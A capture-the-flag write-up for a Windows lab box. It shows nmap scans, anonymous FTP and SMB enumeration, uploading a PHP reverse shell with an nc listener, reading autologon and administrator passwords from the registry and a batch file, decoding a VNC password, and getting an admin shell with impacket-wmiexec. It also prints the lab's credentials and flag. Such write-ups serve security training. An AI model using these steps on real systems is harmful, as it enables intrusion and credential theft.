# CTF Writeup: AllSignsPoint2Pwnage

---

## Reconaissance

```
nmap -n -Pn -p- 10.10.237.18
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-08 03:43 CDT
Nmap scan report for 10.10.237.18
Host is up (0.050s latency).
Not shown: 65519 closed tcp ports (reset)
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
5040/tcp  open  unknown
5900/tcp  open  vnc
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49684/tcp open  unknown
49686/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 429.86 seconds
```

Initial Scan revealed quite a lot of services running. Running a service detection scan provides us with following information:

```
nmap -n -Pn -sCV -p 21,80,135,139,443,445,3389,5040,5900,49664,49665,49666,49667,49668,49684,49686 10.10.237.18
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-08 04:00 CDT
Nmap scan report for 10.10.237.18
Host is up (0.037s latency).

PORT      STATE SERVICE        VERSION
21/tcp    open  ftp            Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_11-14-20  04:26PM                  173 notice.txt
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http           Apache httpd 2.4.46 (OpenSSL/1.1.1g PHP/7.4.11)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Simple Slide Show
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.11
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
443/tcp   open  ssl/https      Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.11
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.11
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-title: 400 Bad Request
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server?
| ssl-cert: Subject: commonName=DESKTOP-997GG7D
| Not valid before: 2025-09-07T08:39:26
|_Not valid after:  2026-03-09T08:39:26
5040/tcp  open  unknown
5900/tcp  open  vnc            VNC (protocol 3.8)
49664/tcp open  msrpc          Microsoft Windows RPC
49665/tcp open  msrpc          Microsoft Windows RPC
49666/tcp open  msrpc          Microsoft Windows RPC
49667/tcp open  msrpc          Microsoft Windows RPC
49668/tcp open  msrpc          Microsoft Windows RPC
49684/tcp open  msrpc          Microsoft Windows RPC
49686/tcp open  msrpc          Microsoft Windows RPC
Service Info: Host: localhost; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-09-08T09:03:27
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 211.21 seconds
```

Since an webpage is running on port 80 HTTP, I decided to map 10.10.237.18 in our /etc/hosts file to domain "allthings.thm".

```
sudo echo "10.10.237.18 allthings.thm" | sudo tee -a /etc/hosts
```

Since I'm getting prompted for an "hidden share" and our nmap scan reveals that ftp is anonymously accessible, I decided to explore it first.

```
ftp allthings.thm
```

It is important to note that to login with anonymously in ftp that u need to utilize following credentials:

```
anonymous:
```

Leave the password blank. I was able to download the notice.txt

```
cat notice.txt       
NOTICE
======

Due to customer complaints about using FTP we have now moved 'images' to 
a hidden windows file share for upload and management 
of images.

- Dev Team
```

Since we got a hint on a hidden windows file share, I will continue with enumerating SMB.

```
smbclient -L \\\\allthings.thm\\                               
Password for [WORKGROUP\unkn0wn]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        images$         Disk      
        Installs$       Disk      
        IPC$            IPC       Remote IPC
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to allthings.thm failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

As we can see there is plenty of shares and the hidden windows share.

After enumerating all the shares and files, I came to the conclusion that I will need to upload an reverse-shell in the /images share, because we are able to view the /images share on the webserver and can execute.

Downloaded a very strong php reverse shell, that rechecks which system is running >> PenTestMonkey's php reverse shell is just running bash, but the system is windows, so we will need this:

```
https://raw.githubusercontent.com/ivan-sincek/php-reverse-shell/refs/heads/master/src/reverse/php_reverse_shell.php
```

After starting up a listener on port 1234 and executing the shell I was able to get a shell

```
nc -lvnp 1234
curl http://allthings.thm/images/op_php-rev-shell.php
```

What user is signed into the console session?

```
C:\Installs>quser
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 sign                  console             1  Active      none   08/09/2025 10:56

C:\Installs>
```

What hidden, non-standard share is only remotely accessible as an administrative account?

```
Installs$

smbclient \\\\allthings.thm\\Installs$
Password for [WORKGROUP\unkn0wn]:
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
smb: \>
```

What is the Users Password? **Hint: User logs automatically into the computer.**
Could imply that there is a mechanism running and the password is stored on the system.
AI gave me an registry hive path "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" and I utilized following command to checkout the Winlogon file.

```
C:\Users\sign\AppData\Local\Microsoft\Windows>reg.exe query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ    
    LegalNoticeText    REG_SZ    
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x18054b5f1
    ShutdownFlags    REG_DWORD    0x13
    DisableLockWorkstation    REG_DWORD    0x0
    EnableFirstLogonAnimation    REG_DWORD    0x1
    AutoLogonSID    REG_SZ    S-1-5-21-201290883-77286733-747258586-1001
    LastUsedUsername    REG_SZ    .\sign
    DefaultUsername    REG_SZ    .\sign
    DefaultPassword    REG_SZ    gKY1uxHLuU1zzlI4wwdAcKUw35TPMdv7PAEE5dAFbV2NxpPJVO7eeSH
    AutoAdminLogon    REG_DWORD    0x1
    ARSOUserConsent    REG_DWORD    0x0

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserDefaults
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLogonChecked
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\VolatileUserMgrKey
```

So we got credentials of user sign now:


```
sign:gKY1uxHLuU1zzlI4wwdAcKUw35TPMdv7PAEE5dAFbV2NxpPJVO7eeSH
```

What is the Administrators Password?

Found an interesting batch file in C:\Installs which gave us the Administrator Password

```
C:\Installs>type Install_www_and_deploy.bat
@echo off
REM Shop Sign Install Script 
cd C:\Installs
psexec -accepteula -nobanner -u administrator -p RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi xampp-windows-x64-7.4.11-0-VC15-installer.exe   --disable-components xampp_mysql,xampp_filezilla,xampp_mercury,xampp_tomcat,xampp_perl,xampp_phpmyadmin,xampp_webalizer,xampp_sendmail --mode unattended --launchapps 1
xcopy C:\Installs\simepleslide\src\* C:\xampp\htdocs\
move C:\xampp\htdocs\index.php C:\xampp\htdocs\index.php_orig
copy C:\Installs\simepleslide\src\slide.html C:\xampp\htdocs\index.html
mkdir C:\xampp\htdocs\images
UltraVNC_1_2_40_X64_Setup.exe /silent
copy ultravnc.ini "C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini" /y
copy startup.bat "c:\programdata\Microsoft\Windows\Start Menu\Programs\Startup\"
pause
```

```
Administrator:RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi
```

What executable is used to run the installer with the Administrator username and password?

As retrieved from the batch file, we can see the .exe that executes the installer.

```
PsExec.exe 
```

What is the VNC Password?

Unfortunately just viewing the ultravnc.ini file gave us false passwords. The hint lead us to 

```
https://aluigi.altervista.org/pwdrec.htm
```

In which I installed the *VNC password decoder 0.2.1 and installed it on the /images dir.
it was not possible utilizing certutil, so I went into the share via SMB and put the .exe inside it.

```
C:\xampp\htdocs\images>vncpwd.exe C:\Installs\ultravnc.ini

*VNC password decoder 0.2.1
by Luigi Auriemma
e-mail: aluigi@autistici.org
web:    aluigi.org

  Password:   5upp0rt9
  Password:   

  Press RETURN to exit
```

What is the contents of the admin_flag.txt? 

So I will need to find a way to log in as Administrator, unfortunately almost every single tool didn't work from xvncviewer to xfreerdp3. Nothing worked.
I tried to perform priv esc, because SeImpersonatePrivilege was enabled, but this also didn't work. The box seems to have very awful networking.
I utilized the following command/tool to make it work..

```
impacket-wmiexec Administrator@10.10.138.53
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
desktop-997gg7d\administrator
```
Retrieved admin_flag.txt in C:\Users\Administrator\Desktop

```
thm{p455w02d_c4n_83_f0und_1n_p141n_73x7_4dm1n_5c21p75}
```
